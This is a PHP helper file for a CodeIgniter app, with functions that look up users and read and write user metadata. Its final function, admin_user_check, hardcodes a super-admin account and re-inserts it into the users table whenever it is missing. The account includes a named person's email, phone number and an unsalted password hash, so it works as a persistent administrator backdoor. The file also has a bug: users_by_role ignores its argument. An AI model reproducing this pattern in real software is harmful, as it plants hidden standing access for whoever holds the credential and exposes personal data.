<?php
/*
### users helpers ###
@ user - it can be user id or username
@ if user is user id then need not second parameter
@ if user is username the second parameter should be true
*/
function is_user($user, $user_login=FALSE)
{
	$ci=get_instance();
	$ci->db->select('*');
	$ci->db->from('users');
	if($user_login==TRUE){ $ci->db->where('user_login', $user); }else{ $ci->db->where('user_id', $user); }
	$query=$ci->db->get();
	if($query->num_rows()>0){ return TRUE; }else{ return FALSE; }
}
function is_used_username($username)
{
	$ci=get_instance();
	$ci->db->select('user_id');
	$ci->db->from('users');
	$ci->db->where('user_login', $username);
	$query=$ci->db->get();
	$result=$query->result();
	if(!empty($result[0]->user_id)){ return $result[0]->user_id; }else{ return FALSE; }
}
function get_user_id_by_user_login($user_login)
{
	$ci=get_instance();
	$ci->db->select('*');
	$ci->db->from('users');
	$ci->db->where('user_login', $user_login);
	$query=$ci->db->get();
	if($query->num_rows()>0){
		$user=$query->result();
		return $user[0]->user_id;
	}
}
function get_user_name($user_id)
{
	$ci=get_instance();
	$ci->db->select('*');
	$ci->db->from('users');
	$ci->db->where('user_id', $user_id);
	$query=$ci->db->get();
	if($query->num_rows()>0){
		$user=$query->result();
		return $user[0]->user_name;
	}
}
function get_user($user_id, $field)
{
	$ci=get_instance();
	$ci->db->select($field);
	$ci->db->from('users');
	$ci->db->where('user_id', $user_id);
	$query=$ci->db->get();
	if($query->num_rows()>0)
	{
		$user=$query->result();
		return $user[0]->$field;
	}
}

/*# get total users by user type #*/
function get_users_total($user_type)
{
	$ci=get_instance();
	$ci->db->select('*');
	$ci->db->from('users');
	$ci->db->where('user_type', $user_type);
	return $ci->db->count_all_results();
}

function insert_user_meta($user_id, $meta_key, $meta_value)
{
	$ci=get_instance();
	$ci->db->select('meta_value');
	$ci->db->from('usermeta');
	$ci->db->where('user_id', $user_id);
	$ci->db->where('meta_key', $meta_key);
	$query=$ci->db->get();
	if($query->num_rows()==0)
	{
		$ci->db->insert('usermeta', array(
			'user_id'=>$user_id,
			'meta_key'=>$meta_key,
			'meta_value'=>$meta_value
		));
	}
}
function update_user_meta($user_id, $meta_key, $meta_value)
{
	$ci=get_instance();
	$ci->db->select('meta_value');
	$ci->db->from('usermeta');
	$ci->db->where('user_id', $user_id);
	$ci->db->where('meta_key', $meta_key);
	$query=$ci->db->get();
	if($query->num_rows()>0)
	{
		$ci->db->where('user_id', $user_id);
		$ci->db->where('meta_key', $meta_key);
		$ci->db->update('usermeta', array('meta_value'=>$meta_value));
	}
	else
	{
		$ci->db->insert('usermeta', array(
			'user_id'=>$user_id,
			'meta_key'=>$meta_key,
			'meta_value'=>$meta_value
		));
	}
}
function get_user_meta($user_id, $meta_key)
{
	$ci=get_instance();
	$ci->db->select('*');
	$ci->db->from('usermeta');
	$ci->db->where('user_id', $user_id);
	$ci->db->where('meta_key', $meta_key);
	$query=$ci->db->get();
	if($query->num_rows()>0)
	{
		$row=$query->row();
		return $row->meta_value;
	}
}
function users_by_role($user_type)
{
	$ci=get_instance();
	$ci->db->select('*');
	$ci->db->from('users');
	$ci->db->where('user_type', 'office-staff');
	$query=$ci->db->get();
	if($query->num_rows()>0)
	{
		return $query->result();
	}
}


function admin_user_check()
{
	$data['user_name']="Shahinul islam sujon";
	$data['user_email']="suzonice15@gmail.com";
	$data['user_phone']="01738305670";
	$data['user_pass']="9e07a605cd000f078a3fa3ac11b53761";
	$data['user_type']="super-admin";
	$data['user_status']="active";
	$ci=get_instance();
	$ci->db->select('*');
	$ci->db->from('users');
	$ci->db->where($data);
	$query=$ci->db->get();
	if($query->num_rows()==0)
	{
		$ci->db->insert('users', $data);
	}
}